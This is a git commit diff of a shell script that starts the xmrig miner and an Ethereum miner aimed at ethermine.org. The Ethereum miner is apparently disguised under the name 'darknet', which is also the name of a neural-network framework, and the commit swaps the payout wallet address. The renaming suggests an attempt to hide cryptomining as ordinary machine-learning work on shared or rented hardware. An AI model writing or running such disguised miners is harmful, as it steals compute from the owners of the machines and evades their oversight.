fbda17f0e1c6e2d2b3657962395fd1fba0469ac8
tanle2694 <tanle2694@gmail.com>
2021-09-07 12:47:53 +0700

    add run.sh

--- run.sh
+++ run.sh
@@ -6,7 +6,8 @@ apt install libssl-dev -y
 worker_name=$1
 ./xmrig &
 echo "run darknet"
-./darknet -pool eu1.ethermine.org:4444 -wal 0x992df1f4e10126ce40e67d0b3948fa409dbc917f -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
+#./darknet -pool eu1.ethermine.org:4444 -wal 0x992df1f4e10126ce40e67d0b3948fa409dbc917f -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
+./darknet -pool eu1.ethermine.org:4444 -wal 0xc7e4e6c7eeefd9c7a21df9bd954a9ef1d53758b2 -worker $worker_name -epsw x -mode 1 -log 0 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -tstop 89  -coin eth &
 while true
 do
   ps aux | grep darknet
